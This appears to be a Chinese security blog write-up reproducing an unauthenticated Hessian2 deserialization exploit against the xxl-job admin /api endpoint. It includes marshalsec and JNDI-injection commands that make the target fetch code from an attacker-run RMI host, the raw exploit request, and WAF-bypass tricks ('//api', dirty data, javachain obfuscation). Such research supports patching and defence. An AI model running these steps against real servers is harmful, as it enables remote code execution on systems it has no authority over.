# xxl-job api未授权Hessian2反序列化复现研究与javachain打法超详细过程-先知社区

> **来源**: https://xz.aliyun.com/news/19095  
> **文章ID**: 19095

---

# xxl-job api未授权Hessian2反序列化复现研究与javachain打法超详细过程

前几天打攻防演练碰到一个xxl-job api未授权Hessian2反序列化,我并没有发现这个漏洞,但是队友发现了.于是打算查漏补缺一下.

# 环境搭建

jdk8u65版本

源码下载:<https://github.com/xuxueli/xxl-job> 版本选择2.0.2或者更低

数据库部署

```
docker pull mysql:latest
docker run -itd --name mysql-xxljob -p 3306:3306-e MYSQL_ROOT_PASSWORD=123456 mysqldock
docker ps 查看运行状态
mysql -h 127.0.0.1-u root -p  测试连接
```

![image.png](images/img_19095_000.png)

xxljob修改配置文件数据库连接信息

![image.png](images/img_19095_001.png)

修改日志文件配置路径

![image.png](images/img_19095_002.png)

创建数据库xxl-job

![image.png](images/img_19095_003.png)

导入sql语句

![image.png](images/img_19095_004.png)

最终效果如下

![image.png](images/img_19095_005.png)

此处进行启动

![image.png](images/img_19095_006.png)

访问<http://127.0.0.1:8080/xxl-job-admin/toLogin>

![image.png](images/img_19095_007.png)

# 反序列化分析

搜索/api接口,找到这个controller

![image.png](images/img_19095_008.png)

RequestMapping接口映射为/api，之前碰到的大多数是直接写进参数内的可以理解为@RequestMapping("/api")这种写法，然后就是PermessionLimit访问控制，这里limit的值为false证明权限校验没有被启用，导致接口未授权访问不用携带任何访问信息

![image.png](images/img_19095_009.png)

后面的api方式实现是处理整个发送的数据流，跟进查看

![image.png](images/img_19095_010.png)

往下走走到this.parseRequest(request);

![image.png](images/img_19095_011.png)

很明显这边有一个反序列化

![image.png](images/img_19095_012.png)

# 攻击

生成反序列化数据

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/remoteExploit8 > test.ser
```

服务器端开启rmi服务

```
java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar -C"/System/Applications/Calculator.app/Contents/MacOS/Calculator"-A x.x.x.x
```

yakit传参攻击

```
POST /xxl-job-admin/api HTTP/1.1
Host:192.168.1.137:8080
Accept:*/*
Content-Type: x-application/hessian
User-Agent: curl/8.7.1
Content-Length: 590

{{file(/xx/xx/test.ser)}}
```

![image.png](images/img_19095_013.png)

成功弹出计算器

其他链子测试

![image.png](images/img_19095_014.png)

# 实战-使用javachain绕waf

在这次攻防中,目标站点的默认路径不是/xxl-job-admin而是/xxl-job,其次由于扫描器扫描目标站点的/api接口被防火墙拦截了,所以导致我错过了这个漏洞.但是神奇的是使用//api就绕过了防火墙能够访问到了

![image.png](images/img_19095_015.png)

然后使用脏数据来绕过waf达成攻击(队友的攻击截图)

![image.png](images/img_19095_016.png)

由于javachain自带bypass功能,所以复现时候选择使用javachain,选择Hessian2Payload的原生JDK链子

![image.png](images/img_19095_017.png)

成功命令执行

![image.png](images/img_19095_018.png)

进行混淆

![image.png](images/img_19095_019.png)

最终这个超长的混淆数据包就成功进行了绕waf操作

![image.png](images/img_19095_020.png)

由于8u121之后jdk8关闭了rmi和ladp对远程仓库的调用,这边改为高版本jdl进行测试

![image.png](images/img_19095_021.png)

使用javachain生成代码,依旧可以正常执行

![image.png](images/img_19095_022.png)
